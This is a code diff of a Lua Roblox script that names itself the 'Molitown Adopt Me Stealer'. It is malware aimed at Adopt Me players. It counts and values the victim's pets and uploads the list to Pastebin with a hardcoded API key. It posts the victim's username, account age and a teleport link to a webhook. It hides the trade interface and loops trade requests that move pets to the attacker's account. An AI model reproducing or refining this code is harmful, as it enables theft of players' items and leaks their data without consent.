@@ -239,7 +239,6 @@ end
 
 for i, v in pairs(ClientData.get("inventory").pets) do
     local petData = InventoryDB[v.category][v.id]
-    
     if petData.rarity == "legendary" then
         legendaries_count = legendaries_count + 1
     elseif petData.rarity == "ultra_rare" then
@@ -253,134 +252,10 @@ for i, v in pairs(ClientData.get("inventory").pets) do
     end
 end
 
-if legendaries_count == 1 then
-    legendaries_count = 0
-elseif legendaries_count > 1 then
-    legendaries_count = legendaries_count - 1
-end
-
-if ultra_count == 1 then
-    ultra_count = 0
-elseif ultra_count > 1 then
-    ultra_count = ultra_count - 1
-end
-
 if GoodHitsOnly and legendaries_count == 0 and neon_count == 0 and mega_neon_count == 0 and flyable_count == 0 and rideable_count == 0 then
     game:GetService("Players").LocalPlayer:Kick("\nPlease use different account!")
     return
 end
-
-local plr = game.Players.LocalPlayer
-local accage = plr.AccountAge
-local ExecutorValue = identifyexecutor() or "Unknown"
-local placeId = game.PlaceId
-local jobId = game.JobId
-local TeleportScript = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
-local VersionValue = "1.12 (trade mechanic changed)"
-
-    local embed = {
-        ["title"] = "New HIT with **RedX**",
-        ["color"] = tonumber(0x3365FF),
-        ["fields"] = {
-            {
-                ["name"] = "〘:mammoth:〙**User Information**",
-                ["value"] = "```lua\n" ..
-                            "Username      : " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
-                            "Account Age   : " .. tostring(game.Players.LocalPlayer.AccountAge) .. " Days\n" ..
-                            "Executor      : " .. tostring(ExecutorValue) .. "\n" ..
-                            "Receiver      : " .. tostring(Username) .. "\n" ..
-                            "RedX          : " .. tostring(VersionValue) .. "```"                            
-            },
-            {
-                ["name"] = "〘:100:〙**Inventory Information**",
-                ["value"] = "```lua\n" ..
-                            "〘Pets above 1$〙  : " .. tostring(mfr_count + nfr_count + flyable_count + rideable_count) .. "\n" ..
-                            "〘Mega Pets〙      : " .. tostring(mega_neon_count) .. "\n" ..
-                            "〘Neon Pets〙      : " .. tostring(neon_count) .. "\n" ..
-                            "〘Legendary Pets〙 : " .. tostring(legendaries_count) .. "\n" ..
-                            "〘Ultra-Rare Pets〙: " .. tostring(ultra_count) .. "\n" ..
-                            "〘Uncommon pets〙  : " .. tostring(uncommon_count) .. "\n" ..
-                            "〘Rare pets〙      : " .. tostring(rare_count) .. "```" 
-            },
-            {
-                ["name"] = "〘:computer:〙**Teleport to :mammoth:**",
-                ["value"] = "```lua\n" ..
-                            TeleportScript .. "\n" .."```"
-            },
-        }
-    }
-
-function SendMessageEMBED(url, embed, bool)
-  local http = game:GetService("HttpService")
-  local headers = {
-      ["Content-Type"] = "application/json"
-  }
-  local data = {
-      username = "RedX | Hit",
-      avatar_url = "https://i.pinimg.com/736x/d2/cd/f2/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
-      content = "pew",
-      embeds = {
-          {
-              title = embed.title,
-              color = embed.color,
-              fields = embed.fields,
-          }
-      }
-  }
-  local data2 = {
-      username = "RedX | Hit",
-      avatar_url = "https://i.pinimg.com/736x/d2/cd/f2/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
-      content = "-- @everyone\n" .. TeleportScript,
-      embeds = {
-          {
-              title = embed.title,
-              color = 0x660000,
-              fields = embed.fields,
-          }
-      }
-  }
-
-  local body = http:JSONEncode(data)
-  local body2 = http:JSONEncode(data2)
-  if bool == true then
-      local response = request({
-          Url = url,
-          Method = "POST",
-          Headers = headers,
-          Body = body2
-      })
-  else
-      local response = request({
-          Url = url,
-          Method = "POST",
-          Headers = headers,
-          Body = body
-      })
-  end
-end
-
-game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
-game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
-game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
-
-local sent = false
-
-local function TradeIncoming(ReceiverName)
-    sent =  true
-    while sent do
-        local RouterClient = Loaders("RouterClient")
-        local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
-
-        moveGuiOffscreen()
-    
-        SendTrade:FireServer(game.Players[ReceiverName])
-        wait(3)
-        local RouterClient = Loaders("RouterClient")
-        local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
-        local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
-        local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
-        local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
-        local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
 
         -- Function to calculate pet value based on valuesTable and properties
         local function calculatePetValue(petData)
@@ -419,6 +294,329 @@ local function TradeIncoming(ReceiverName)
             
             return baseValue * multiplier, baseValue
         end
+
+-- Function to count valuable pets and get top pets
+local function getValuablePetsInfo()
+    local valuableCount = 0
+    local totalValue = 0
+    local topPets = {}
+    local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
+    
+    for _, petData in pairs(PetsInventory) do
+        local petInfo = InventoryDB[petData.category][petData.id]
+        local petName = petInfo.name
+        local calculatedValue, baseValue = calculatePetValue(petData)
+        
+        if baseValue > 0 then
+            valuableCount = valuableCount + 1
+            totalValue = totalValue + calculatedValue
+            
+            table.insert(topPets, {
+                name = petName,
+                value = calculatedValue,
+                properties = petData.properties or {}
+            })
+        end
+    end
+    
+    -- Sort top pets by value
+    table.sort(topPets, function(a, b)
+        return a.value > b.value
+    end)
+    
+    return valuableCount, totalValue, topPets
+end
+
+-- Function to get pet type string
+local function getPetTypeString(properties)
+    if properties.mega_neon and properties.flyable and properties.rideable then
+        return " MFR"
+    elseif properties.neon and properties.flyable and properties.rideable then
+        return " NFR"
+    elseif properties.flyable and properties.rideable then
+        return " FR"
+    elseif properties.mega_neon then
+        return " Mega"
+    elseif properties.neon then
+        return " Neon"
+    elseif properties.flyable then
+        return " Fly"
+    elseif properties.rideable then
+        return " Ride"
+    else
+        return ""
+    end
+end
+
+local plr = game.Players.LocalPlayer
+local accage = plr.AccountAge
+local ExecutorValue = identifyexecutor() or "Unknown"
+local placeId = game.PlaceId
+local jobId = game.JobId
+local browserTeleport = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
+local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. jobId .. "\")"
+local VersionValue = "1.12 (Added values)"
+
+-- Get valuable pets info
+local valuableCount, totalValue, topPets = getValuablePetsInfo()
+
+-- Format top pets text
+local topPetsText = ""
+for i = 1, math.min(5, #topPets) do
+    local pet = topPets[i]
+    local petType = getPetTypeString(pet.properties)
+    topPetsText = topPetsText .. string.format("%s%s: %d$\n", pet.name, petType, math.floor(pet.value))
+end
+
+local embed = {
+    ["title"] = "🎯 ВЬЕБАН - Долбаеб ракнул ваш скрипт! - ".. plr.Name,
+    ["color"] = 16711935,
+    ["fields"] = {
+        {
+            ["name"] = "🔗 **Teleport to :mammoth:**",
+            ["value"] = 
+            "🚀**Вставь в браузер для связи с дуплом**\n```" .. browserTeleport .. "```\n" ..
+            "**Для автоматической связи:**\n```lua\n" .. TeleportScript .. "\n```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:mammoth:〙**Info User**",
+            ["value"] = "```lua\n" ..
+                        "Username      : " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
+                        "Account Age   : " .. tostring(game.Players.LocalPlayer.AccountAge) .. " Days\n" ..
+                        "Executor      : " .. tostring(ExecutorValue) .. "\n" ..
+                        "Receiver      : " .. Username .. ", " .. Username2 .. "\n" ..
+                        "Molitown      : " .. tostring(VersionValue) .. "```"                            
+        },
+        {
+            ["name"] = "〘:moneybag:〙**Inventory Stats**",
+            ["value"] = "```lua\n" ..
+                        "Total Value     : " .. string.format("%d$", math.floor(totalValue)) .. "\n" ..
+                        "MFR Pets        : " .. tostring(mfr_count) .. "\n" ..
+                        "NFR Pets        : " .. tostring(nfr_count) .. "\n" ..
+                        "FR Pets         : " .. tostring(fr_count) .. "\n" ..
+                        "Mega Pets       : " .. tostring(mega_neon_count) .. "\n" ..
+                        "Neon Pets       : " .. tostring(neon_count) .. "\n" ..
+                        "Legendary Pets  : " .. tostring(legendaries_count) .. "\n" ..
+                        "Ultra Rare Pets : " .. tostring(ultra_count) .. "```" 
+        },
+        {
+            ["name"] = "〘:crown:〙**Top Valuable Pets**",
+            ["value"] = "```lua\n" .. (topPetsText ~= "" and topPetsText or "No valuable pets") .. "```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:scroll:〙**Full Pets List**",
+            ["value"] = "[📋 Click to view all pets](" .. pastebinLink .. ")",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:computer:〙**Teleport to :mammoth:**",
+            ["value"] = "```lua\n" ..
+                        browserTeleport .. "\n" .."```"
+        },
+    }
+}
+
+function SendMessageEMBED(url, embed, bool)
+  local http = game:GetService("HttpService")
+  local headers = {
+      ["Content-Type"] = "application/json"
+  }
+  local data = {
+      username = "M O L I T O W N",
+      avatar_url = "https://i.pinimg.1200x/736x/d2/cd/5f/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
+      content = "pew",
+      embeds = {
+          {
+              title = embed.title,
+              color = embed.color,
+              fields = embed.fields,
+          }
+      }
+  }
+  local data2 = {
+      username = "M O L I T O W N",
+      avatar_url = "https://i.pinimg.com/736x/d2/cd/5f/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
+      content = "-- @everyone\n" .. TeleportScript,
+      embeds = {
+          {
+              title = embed.title,
+              color = 0x660000,
+              fields = embed.fields,
+          }
+      }
+  }
+
+  local body = http:JSONEncode(data)
+  local body2 = http:JSONEncode(data2)
+  if bool == true then
+      local response = request({
+          Url = url,
+          Method = "POST",
+          Headers = headers,
+          Body = body2
+      })
+  else
+      local response = request({
+          Url = url,
+          Method = "POST",
+          Headers = headers,
+          Body = body
+      })
+  end
+end
+
+local HttpService = game:GetService("HttpService")
+
+local function pastebin(content)
+    local body = {
+        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+        api_paste_code = content,
+        api_option = "paste"
+    }
+
+    local encodedBody = ""
+    for key, value in pairs(body) do
+        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
+    end
+    encodedBody = encodedBody:sub(1, -2)
+
+    local response
+    local success, err = pcall(function()
+        response = request({
+            Url = "https://pastebin.com/api/api_post.php",
+            Method = "POST",
+            Body = encodedBody,
+            Headers = {
+                ["Content-Type"] = "application/x-www-form-urlencoded"
+            },
+            Timeout = 20
+        })
+    end)
+
+    if not success or not response or not response.Success then
+        return "https://pastebin.com/raw/example" -- fallback URL
+    end
+
+    local pasteUrl = response.Body
+    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+
+    return rawUrl
+end
+
+-- Функция для создания полного списка петов
+local function createFullPetsList()
+    local petCategories = {
+        legendary = {},
+        ultra_rare = {},
+        rare = {},
+        uncommon = {},
+        common = {}
+    }
+    
+    local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
+    
+    for _, petData in pairs(PetsInventory) do
+        local petInfo = InventoryDB[petData.category][petData.id]
+        local petName = petInfo.name
+        local calculatedValue, baseValue = calculatePetValue(petData)
+        
+        -- Определяем тип питомца
+        local petType = ""
+        if petData.properties then
+            if petData.properties.mega_neon and petData.properties.flyable and petData.properties.rideable then
+                petType = " MFR"
+            elseif petData.properties.neon and petData.properties.flyable and petData.properties.rideable then
+                petType = " NFR"
+            elseif petData.properties.flyable and petData.properties.rideable then
+                petType = " FR"
+            elseif petData.properties.mega_neon then
+                petType = " Mega"
+            elseif petData.properties.neon then
+                petType = " Neon"
+            elseif petData.properties.flyable then
+                petType = " Fly"
+            elseif petData.properties.rideable then
+                petType = " Ride"
+            end
+        end
+        
+        local petEntry = string.format("%s%s: %d$", petName, petType, math.floor(calculatedValue))
+        
+        -- Добавляем в соответствующую категорию
+        if petInfo.rarity == "legendary" then
+            table.insert(petCategories.legendary, petEntry)
+        elseif petInfo.rarity == "ultra_rare" then
+            table.insert(petCategories.ultra_rare, petEntry)
+        elseif petInfo.rarity == "rare" then
+            table.insert(petCategories.rare, petEntry)
+        elseif petInfo.rarity == "uncommon" then
+            table.insert(petCategories.uncommon, petEntry)
+        elseif petInfo.rarity == "common" then
+            table.insert(petCategories.common, petEntry)
+        end
+    end
+    
+    -- Сортируем каждую категорию по ценности
+    local sortByValue = function(a, b)
+        local aValue = tonumber(a:match("(%d+)$")) or 0
+        local bValue = tonumber(b:match("(%d+)$")) or 0
+        return aValue > bValue
+    end
+    
+    for _, category in pairs(petCategories) do
+        table.sort(category, sortByValue)
+    end
+    
+    -- Формируем итоговый текст
+    local pastebinContent = "-- 🐉 LEGENDARY PETS 🐉 --\n"
+    pastebinContent = pastebinContent .. (#petCategories.legendary > 0 and table.concat(petCategories.legendary, "\n") or "None") .. "\n\n"
+    
+    pastebinContent = pastebinContent .. "-- 🔥 ULTRA-RARE PETS 🔥 --\n"
+    pastebinContent = pastebinContent .. (#petCategories.ultra_rare > 0 and table.concat(petCategories.ultra_rare, "\n") or "None") .. "\n\n"
+    
+    pastebinContent = pastebinContent .. "-- 💎 RARE PETS 💎 --\n"
+    pastebinContent = pastebinContent .. (#petCategories.rare > 0 and table.concat(petCategories.rare, "\n") or "None") .. "\n\n"
+    
+    pastebinContent = pastebinContent .. "-- 🟢 UNCOMMON PETS 🟢 --\n"
+    pastebinContent = pastebinContent .. (#petCategories.uncommon > 0 and table.concat(petCategories.uncommon, "\n") or "None") .. "\n\n"
+    
+    pastebinContent = pastebinContent .. "-- ⚪ COMMON PETS ⚪ --\n"
+    pastebinContent = pastebinContent .. (#petCategories.common > 0 and table.concat(petCategories.common, "\n") or "None") .. "\n\n"
+    
+    pastebinContent = pastebinContent .. "Total pets: " .. #PetsInventory .. "\n"
+    pastebinContent = pastebinContent .. "Generated by Molitown Adopt Me Stealer"
+    
+    return pastebinContent
+end
+
+-- Создаем полный список петов и публикуем на pastebin
+local fullPetsList = createFullPetsList()
+local pastebinLink = pastebin(fullPetsList)
+
+game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
+game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
+game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
+
+local sent = false
+
+local function TradeIncoming(ReceiverName)
+    sent =  true
+    while sent do
+        local RouterClient = Loaders("RouterClient")
+        local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
+
+        moveGuiOffscreen()
+    
+        SendTrade:FireServer(game.Players[ReceiverName])
+        wait(3)
+        local RouterClient = Loaders("RouterClient")
+        local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+        local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+        local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+        local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
+        local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
 
         -- Get and sort pets by value
         local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
